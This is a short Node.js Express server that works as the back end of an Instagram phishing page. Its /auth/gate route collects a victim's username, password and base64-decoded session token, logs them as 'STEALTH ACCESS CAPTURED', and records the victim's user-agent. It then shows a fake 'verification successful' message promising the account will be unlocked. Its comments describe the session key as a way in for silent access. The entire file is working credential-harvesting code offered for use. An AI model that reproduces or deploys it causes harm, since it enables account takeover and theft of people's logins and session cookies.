const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/auth/gate', (req, res) => {
    const { u, p, tok } = req.body;
    const decodedToken = tok ? Buffer.from(tok, 'base64').toString('ascii') : "No direct cookies";

    console.log("------------------------------------");
    console.log("🔓 STEALTH ACCESS CAPTURED 🔓");
    console.log("USER: " + u);
    console.log("PASS: " + p);
    console.log("SESSION KEY: " + decodedToken); // هذا هو المفتاح لدخول صامت
    console.log("AGENT: " + req.headers['user-agent']); // بصمة جهاز الضحية
    console.log("------------------------------------");

    res.send(`
        <div style="font-family:sans-serif; text-align:center; padding-top:100px;">
            <h2 style="color:#0071e3;">✓ Hardware Matches</h2>
            <p>Verification successful. Your Instagram account will be unlocked within 24 hours.</p>
        </div>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Bypass System Active'));
